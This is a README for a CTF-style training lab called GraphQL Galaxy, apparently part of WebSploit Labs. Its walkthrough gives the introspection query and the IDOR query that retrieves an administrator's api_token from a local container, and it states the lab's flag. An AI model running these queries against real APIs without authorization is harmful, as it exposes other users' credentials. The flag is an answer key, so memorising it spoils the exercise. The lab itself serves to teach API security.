# GraphQL Galaxy: API Hacking Lab

**Lab Name:** `graphql-galaxy`
**Vulnerability:** GraphQL Introspection, Information Disclosure, IDOR

## Description
This lab simulates a futuristic communications hub that exposes a GraphQL API. The API is misconfigured to allow full schema introspection, revealing sensitive fields and internal types. Additionally, the resolvers lack proper authorization checks, allowing users to access data they shouldn't (IDOR).

## Learning Objectives
- Understand GraphQL Introspection and how to use it for reconnaissance.
- Identify sensitive fields in a GraphQL schema.
- Exploit IDOR vulnerabilities in GraphQL resolvers.
- Learn how to use GraphiQL to interact with the API.

## Installation
This lab is part of the WebSploit Labs framework and it is running on the `graphql-galaxy` container on the `10.6.6.44` IP address.

To run it individually:
```bash
docker build -t graphql-galaxy .
docker run -p 5023:5023 graphql-galaxy
```

## Walkthrough

1. Access the lab at `http://10.6.6.44:5023`.
2. Click on "Enter GraphiQL Console" to open the GraphQL interface.
3. Run an introspection query to discover the schema:
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        description
      }
    }
  }
}
```
4. Notice the `User` type has fields including `api_token`.
5. Query all users to see the public data:
```graphql
{
  users {
    id
    username
    email
    api_token
  }
}
```
6. Notice that `api_token` shows as `[REDACTED]` in the list view.
7. Exploit the IDOR vulnerability by querying a specific user directly:
```graphql
{
  user(id: "1") {
    id
    username
    email
    api_token
    is_admin
    notes
  }
}
```
8. The admin's `api_token` is revealed: `FLAG{GRAPHQL_INTROSPECTION_MASTER}`

## Challenge Summary
- **Reconnaissance:** Use the GraphiQL interface to inspect the available queries and types.
- **Introspection:** Find the hidden `api_token` field in the `User` type.
- **Exploitation:** Query the `user` field with the ID of the administrator (`1`) and request the `api_token`.
- **Flag:** The flag is the value of the administrator's `api_token`.

## References
For more information on GraphQL security vulnerabilities and secure coding practices, check out these resources:

- **Redefining Hacking: A Comprehensive Guide to Red Teaming and Bug Bounty Hunting in an AI-driven World** - [Available on O'Reilly](https://learning.oreilly.com/library/view/redefining-hacking-a/9780138363635/)
- **Developing Cybersecurity Programs and Policies in an AI-Driven World** - [Available on O'Reilly](https://learning.oreilly.com/library/view/developing-cybersecurity-programs/9780138073992)
- **Beyond the Algorithm: AI, Security, Privacy, and Ethics** - [Available on O'Reilly](https://learning.oreilly.com/library/view/beyond-the-algorithm/9780138268442)
- **The AI Revolution in Networking, Cybersecurity, and Emerging Technologies** - [Available on O'Reilly](https://learning.oreilly.com/library/view/the-ai-revolution/9780138293703)

## Additional References

- **Building the Ultimate Cybersecurity Lab and Cyber Range (video)** - [Available on O'Reilly](https://learning.oreilly.com/course/building-the-ultimate/9780138319090/)
- **Build Your Own AI Lab (video)** - [Available on O'Reilly](https://learning.oreilly.com/course/build-your-own/9780135439616)
- **Defending and Deploying AI (video)** - [Available on O'Reilly](https://www.oreilly.com/videos/defending-and-deploying/9780135463727/)
- **AI-Enabled Programming, Networking, and Cybersecurity** - [Available on O'Reilly](https://learning.oreilly.com/course/ai-enabled-programming-networking/9780135402696/)
- **Securing Generative AI** - [Available on O'Reilly](https://learning.oreilly.com/course/securing-generative-ai/9780135401804/)
- **The Art of Hacking** - [Visit The Art of Hacking](https://theartofhacking.org)
- **Hacking Scenarios (Labs) in O'Reilly** - [https://hackingscenarios.com](https://hackingscenarios.com)
- **GitHub Repository** - [Visit GitHub Repo](https://hackerrepo.org)
- **WebSploit Labs** - [Visit WebSploit Labs](https://websploit.org)
- **NetAcad Ethical Hacker Free Course** - [Available (free) on NetAcad Skills for All](https://www.netacad.com/courses/ethical-hacker?courseLang=en-US)